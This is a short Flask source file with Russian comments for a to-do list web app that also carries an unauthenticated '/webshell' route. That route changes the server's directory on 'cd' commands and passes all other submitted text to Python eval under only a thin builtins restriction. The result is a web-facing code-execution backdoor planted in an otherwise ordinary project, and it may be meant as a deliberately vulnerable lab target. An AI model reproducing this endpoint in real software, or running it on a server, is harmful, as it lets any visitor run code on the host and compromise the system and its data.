from flask import Flask, render_template, request, redirect
import subprocess, os

app = Flask(__name__)

# Список задач
tasks = []

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        task = request.form['task']
        tasks.append(task)
        return redirect('/')
    return render_template('index.html', tasks=tasks)

# С функцией Eval
@app.route('/webshell', methods=['GET', 'POST'])
def webshell():
    if request.method == 'POST':
        command = request.form.get('command')
        try:
            if command.startswith('cd '):
                directory = command.split(' ')[1]
                os.chdir(directory)
                result = f"Changed directory to: {directory}"
            else:
                # Evaluate the command as Python code
                result = eval(command, {'__builtins__': {'dir': dir}})
        except Exception as e:
            result = str(e)
        return render_template('webshell.html', command=command, result=result)
    return render_template('webshell.html', command='', result='')

if __name__ == '__main__':
    app.run()